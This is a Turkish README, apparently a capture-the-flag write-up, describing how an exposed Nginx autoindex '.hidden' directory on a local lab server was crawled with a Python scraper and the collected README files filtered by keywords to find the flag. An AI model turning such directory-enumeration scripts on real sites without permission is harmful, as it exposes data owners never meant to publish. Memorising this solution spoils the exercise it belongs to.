# README.md

## Proje Açıklaması

Daha önceden `.hidden` adlı bir alanı görmüştüm ve bunu keşfetmeye karar verdim. `localhost:8080/.hidden/` adresine gittiğimde, Nginx tarafından `auto_index` sayfasının ayarlandığını fark ettim. Bu, klasörlere erişebildiğim anlamına geliyordu ve bu büyük bir güvenlik açığıydı. Bütün klasörler içerisinde özgürce dolaşabiliyordum.

## Çözüm

Görevi benim için biraz zorlaştırmışlardı; her bir klasöre tıklayarak `README.md` dosyalarından flag'i bulmak yerine, bir Python kodu yazmaya karar verdim. Bu kod, bütün `README.md` dosyalarını klasörlere girerek toplayıp `output.txt` dosyasına yazacak şekilde ayarlandı.

## Kod

Kodun tamamını [main.py](#file:main.py-context) dosyasında bulabilirsiniz.

```python
import requests
from bs4 import BeautifulSoup
import time

def scrape_readme_files(url, output_file):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Open the output file in append mode
    with open(output_file, 'a') as outfile:
        for link in soup.find_all('a'):
            href = link.get('href')
            # Skip parent directory link
            if href == "../":
                continue
            # Construct the URL for the subdirectory or file
            full_url = url + href
            if href.endswith('/'):
                # Recursively scrape subdirectories
                scrape_readme_files(full_url, output_file)
            elif href == "README.md":
                # Fetch and write the content of README.md to the output file
                readme_response = requests.get(full_url)
                if readme_response.status_code == 200:
                    outfile.write(f"Contents of {full_url}:\n")
                    outfile.write(readme_response.text)
                    outfile.write("\n\n")
            time.sleep(1)

base_url = "http://localhost:8080/.hidden/"
output_file = "output.txt"

# Clear the output file before starting
open(output_file, 'w').close()

# Start scraping
scrape_readme_files(base_url, output_file)
```

## Sonuç

Bu kod sayesinde, `README.md` dosyalarını otomatik olarak toplayarak `output.txt` dosyasına yazdım bunlar arasında bir kaç inceleme yaptıktan sonra sabit sürekli bazı mesajlar var bunlar arasında da filtreleme yaptığım bir kod yazarsam sonuca ulaşacaktım o da şu kod oldu:

```python
def filter_output_file(input_file, output_file, keywords):
    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        write_line = False
        for line in infile:
            if any(keyword in line for keyword in keywords):
                write_line = False
            elif line.startswith("Contents of"):
                write_line = True
                outfile.write(line)
            elif write_line:
                outfile.write(line)

input_file = "output.txt"
output_file = "filtered_output.txt"
keywords = ["Demande", "Tu veux", "Toujours", "Non ce"]

filter_output_file(input_file, output_file, keywords)
```

ve sonuç olarak `filtered_output.txt` içerisinde flag değerine ulaştık.
